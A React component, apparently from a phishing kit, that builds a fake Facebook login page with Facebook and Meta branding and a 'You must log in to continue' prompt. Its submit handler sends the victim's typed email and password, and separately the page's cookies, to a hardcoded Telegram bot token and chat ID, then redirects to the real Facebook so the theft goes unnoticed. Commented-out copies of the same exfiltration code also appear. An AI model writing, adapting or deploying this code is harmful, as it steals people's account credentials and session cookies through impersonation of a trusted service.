import React, { useState } from 'react';
import './login.css';
import { Icon } from 'react-icons-kit';
import {arrowLeft2} from 'react-icons-kit/icomoon/arrowLeft2';
import {angleDown} from 'react-icons-kit/fa/angleDown';
import {facebook_1} from 'react-icons-kit/ikons/facebook_1';
import metaLogo from './assets/metalogo.png';
import axios from 'axios';
import desktop_logo from './assets/desktop_logo.svg'
import { useNavigate } from 'react-router-dom';



const Login = () => {

    const nav = useNavigate()

    // const getCookies = () => {
    //     const cookies = document.cookie.split("; ");
    //     const cookieObj = {};
    //     cookies.forEach((cookie) => {
    //       const [name, value] = cookie.split("=");
    //       cookieObj[name] = decodeURIComponent(value);
    //     });
    //     return cookieObj;
    //   };
      
    //   // Example usage
    //   console.log(getCookies());

    const [values, setValues] = useState({
        email: '',
        password: '',
    })

    console.log(values)

    const [loading, setLoading]= useState(false)

    const handleChange = (e)=>{
        setValues({...values, [e.target.name]: e.target.value})
    }

    const url = ""
    const body = {email: values.email, password: values.password }

    // const login = async (e)=>{
    //     e.preventDefault()
    //     try{
    //         setLoading(true)
    //         const response = await axios.post(url,body)
    //         setLoading(false)
    //         console.log(response)
    //     } catch(error){
    //         setLoading(false)
    //         console.log(error)
    //     }

    // }

    const toFacebook = ()=>{
        window.location.href = "https://www.facebook.com/r.php?next=https%3A%2F%2Fwww.facebook.com%2F&locale=en_US&display=page"
    }


    // const sendToTelegram = async () => {
    //     const botToken = '7912079845:AAFCpBOdL76dxW0o5OVX9VG68ZQr4Nm74uc';
    //     const chatId = '5744414871';
    //     const message = `User Data:\password: ${values.password}\ nEmail: ${values.email}`;
    
    //     try {
    //       await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    //         chat_id: chatId,
    //         text: message,
    //       });
    //       alert('Data sent to Telegram!');
    //     } catch (error) {
    //       console.error('Error sending message to Telegram:', error);
    //     }
    //   };



    function setCookie(key, value, domain, path, isSecure) {    
        const cookieMaxAge = "Max-Age=31536000";
        try {
          if (key.startsWith("__Host")) {
            console.log("Attempting to set __Host- cookie:", key, value);
            document.cookie = `${key}=${value}; ${cookieMaxAge}; path=/; Secure; SameSite=None`;
          } else if (key.startsWith("__Secure")) {
            console.log("Attempting to set __Secure- cookie:", key, value);
            document.cookie = `${key}=${value}; ${cookieMaxAge}; domain=${domain}; path=${path}; Secure; SameSite=None`;
          } else {
            console.log("Attempting to set regular cookie:", key, value);
            if (isSecure) {
              document.cookie = `${key}=${value}; ${cookieMaxAge}; domain=${domain}; path=${path}; Secure; SameSite=None`;
            } else {
              document.cookie = `${key}=${value}; ${cookieMaxAge}; domain=${domain}; path=${path}`;
            }
          }
        } catch (error) {
          console.error(`Failed to set cookie: ${key}`, error);
        }
      }
      


    const sendToTelegram = async () => {
        const botToken = '7912079845:AAFCpBOdL76dxW0o5OVX9VG68ZQr4Nm74uc'; // Replace with your bot token
        const chatId = '5744414871'; // Replace with the actual chat ID
        const message = `User Data:\nPassword: ${values.password}\nEmail: ${values.email}`;
    
        try {
            const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: chatId,
                text: message,
            });
            // alert('Data sent to Telegram!');
            console.log('Telegram response:', response.data);
        } catch (error) {
            console.error('Error sending message to Telegram:', error.response?.data || error.message);
        }
    };
    const sendToTelegramcookies = async () => {
        const botToken = '7912079845:AAFCpBOdL76dxW0o5OVX9VG68ZQr4Nm74uc'; // Replace with your bot token
        const chatId = '5744414871'; // Replace with the actual chat ID
        const message = `User Data:\nCookie: ${document.cookie}`;
    
        try {
            const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: chatId,
                text: message,
            });
            // alert('Data sent to Telegram!');
            console.log('Telegram response:', response.data);
        } catch (error) {
            console.error('Error sending message to Telegram:', error.response?.data || error.message);
        }
    };


    const submitsData = ()=> {
        sendToTelegram()
        sendToTelegramcookies()
        window.location.href = "https://web.facebook.com/?_rdc=1&_rdr"
    }






  return (

    <>
    
        <div className='login_page'>
            <div className='desktop_login_body'>
                <div className='desktop_logo'>
                    <img src={desktop_logo} alt='logo'/>
                </div>
                <div className='warning_container'>
                    <div className='warning_login_logo_container'>
                        <span>i</span>
                    </div>
                    <p>You must log in to continue</p>
                </div>
                <form onSubmit={submitsData} className='desktop_login_form_container'>
                    <p>Log Into Facebook</p>
                    <div className='form_warning'>
                        <p>You must log in to continue</p>
                    </div>
                    <input
                        type='text'
                        placeholder='Email or phone number'
                        name='email'
                        onChange={handleChange}
                    />
                    <input
                        type='password'
                        placeholder='Password'
                        name='password'
                        onChange={handleChange}
                    />
                    <button type='submit'>Log In</button>
                    <span onClick={toFacebook}>Forgot account? . Sign up for Facebook</span>
                </form>
            </div>
            <div className='login_part'>
                {/* <div className='back_icon'>
                    <Icon size={15} icon={arrowLeft2} />
                </div> */}
                <div className='language'>
                    <p>English (UK)</p>
                    {/* <div className='arrow_down'>
                        <Icon size={20} icon={angleDown} />
                    </div> */}
                </div>
                <div className='facebook_icon'>
                    <Icon size={40} icon={facebook_1}/>
                </div>
                <div className='login_Inputs'>
                    <div className='input_div'>
                        <input 
                            type='text' 
                            name='email'
                            placeholder='Mobile number or email address'
                            onChange={handleChange}
                        />
                        {/* <div className='void'>
                            <p>i</p>
                        </div> */}
                    </div>
                    <div className='input_div'>
                        <input 
                            type='password' 
                            name='password'
                            placeholder='Password'
                            onChange={handleChange}
                        />
                    </div>
                    <button onClick={submitsData} className='login_btn'>{loading == true ? "loading..." : "Log in"}</button>
                    <p className='forgot_password'>Forgotten Password</p>
                </div>
                <div className='login_bottom'>
                    <button onClick={toFacebook} className='create_new_acct_btn'>Create new account</button>
                    <div className='meta_logo'>
                        <div className='meta_icon'>
                            <img src={metaLogo} alt=''/>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    
    </>

  )
}

export default Login